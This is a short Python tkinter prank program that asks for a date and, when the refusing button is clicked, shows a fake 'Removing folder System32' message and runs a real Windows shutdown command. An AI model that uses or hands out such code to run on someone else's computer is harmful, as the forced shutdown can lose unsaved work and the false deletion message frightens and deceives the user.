import os
from tkinter import*
from pygame import mixer

os.system('cls')


def refuse():
    """
    In case of refuse the message about removing System32 appears
    and then computer turns off. Button "Sorry" does nothing
    """
    ref = Toplevel()
    ref.geometry('400x150+500+500')
    ref.title('Why have you chosen this...')
    ref.overrideredirect(False)
    Label(ref, text='Removing folder System32 from Your computer').pack(expand=1)
    bttn = Button(ref, text='Sorry...')
    bttn.pack(anchor='s', pady=15)
    ref.after(5000, lambda: ref.destroy())
    root.after(5000, lambda: root.destroy())
    os.system('shutdown /s /t 10')
    
    
def agree():
    """
    In case of yes the message appears and then
    program will be closed
    """
    agr = Toplevel()
    agr.geometry('400x150+500+500')
    agr.overrideredirect(True)
    Label(agr, text='Great! What would you like to do?').pack(expand=1)
    agr.after(5000, lambda: agr.destroy())
    root.after(5000, lambda: root.destroy())


root = Tk()
root.overrideredirect(True)
root.geometry('400x100+400+400')

"""
If you want, you can also add the music.
You should enter the music file into the root folder
and write the file's name in the function mixer.music.load()
Also you need install the library 'pygame'
"""
# mixer.init()
# mixer.music.load('lucid.mp3')
# mixer.music.play()

Label(text="Sweetheart, let's date tonight?").pack()
b1 = Button(root, text='Of course, with pleasure, honey!', command=agree)
b1.pack(expand=True)
b2 = Button(root, text="I'm busy, I don't want", command=refuse)
b2.pack(expand=True)
root.mainloop()
